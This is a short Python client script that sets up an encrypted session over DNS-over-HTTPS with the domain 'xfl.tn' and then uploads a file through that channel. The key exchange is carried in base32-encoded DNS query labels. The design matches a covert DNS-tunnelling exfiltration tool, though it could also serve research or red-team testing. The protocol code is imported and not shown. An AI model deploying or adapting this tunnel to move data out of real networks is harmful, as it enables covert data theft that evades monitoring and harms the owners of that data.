#import base64
#import subprocess
#import dns.message
#import struct
#import ipaddress
#from nacl.secret import SecretBox
#from nacl.exceptions import CryptoError
from nacl.public import PrivateKey
from doh import DoHProtocol, HelloProtocol, UploadProtocol

def generate_curve25519_keypair():
    """
    Generates a Curve25519 (X25519) key pair using PyNaCl.

    Returns:
        private_bytes (bytes): 32-byte private key
        public_bytes (bytes): 32-byte public key
    """
    private_key = PrivateKey.generate()
    public_key = private_key.public_key

    private_bytes = bytes(private_key)
    public_bytes = bytes(public_key)

    return private_bytes, public_bytes


if __name__ == "__main__":
    
    doh = DoHProtocol()
    hello = HelloProtocol(doh)

    
    private_key_bytes, public_key_bytes = generate_curve25519_keypair()
    print(f"[+] Client's Private Key: {private_key_bytes.hex()}")
    print(f"[+] Client's Public Key : {public_key_bytes.hex()}")

    b32_label = doh.encode_base32hex_nopad(public_key_bytes)
    full_qname = f"{b32_label}.xfl.tn"

    query_bytes = doh.build_dns_query(full_qname)
    encoded_query = doh.encode_query_base64url(query_bytes)
    dns_response = doh.send_doh_query(encoded_query)

    if dns_response is None:
        print("[-] No DS response. Exiting")
        exit(1)

    session_id, timestamp, derived_shared_key = hello.get_sessionid_and_sharedkey(dns_response, private_key_bytes, doh)
    
    #session_id = "bgl8xxq"
    #derived_shared_key = bytes.fromhex("274e17c7b7fffc524fe245d189bb53af2e9e82a0d24210f47a6fa2e7847e3d3a")
    print(f"[+] Session ID: {session_id}, timestamp: {timestamp}/{hex(timestamp)}\
          shared_key: {derived_shared_key.hex()}, len: {len(derived_shared_key)}\n")
    upload = UploadProtocol(doh, session_id, timestamp, derived_shared_key)
    upload.sendfile("upload_file.bin")

